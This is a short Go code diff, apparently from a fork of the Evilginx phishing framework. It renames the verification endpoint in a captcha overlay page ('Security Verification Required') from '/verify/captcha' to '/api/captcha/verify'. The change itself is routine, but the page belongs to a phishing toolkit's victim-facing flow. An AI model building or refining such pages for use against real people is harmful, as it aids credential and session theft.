@@ -202,7 +202,7 @@ func (cm *CaptchaManager) GetCaptchaHTML() string {
 	<div style="position:fixed;top:50%%;left:50%%;transform:translate(-50%%,-50%%);background:white;padding:30px;border-radius:10px;box-shadow:0 4px 20px rgba(0,0,0,0.3);z-index:9999;">
 		<h3 style="margin-top:0;">Security Verification Required</h3>
 		<p>Please complete the security check to continue.</p>
-		<form id="evilginx-captcha-form" method="POST" action="/verify/captcha">
+		<form id="evilginx-captcha-form" method="POST" action="/api/captcha/verify">
 			%s
 			<div style="margin-top:20px;">
 				<button type="submit" style="padding:10px 20px;background:#007bff;color:white;border:none;border-radius:5px;cursor:pointer;">Continue</button>
@@ -237,7 +237,7 @@ func (cm *CaptchaManager) GetCaptchaHTML() string {
 			%s
 			
 			// Send verification request
-			fetch('/verify/captcha', {
+			fetch('/api/captcha/verify', {
 				method: 'POST',
 				headers: {'Content-Type': 'application/json'},
 				body: JSON.stringify({response: response})
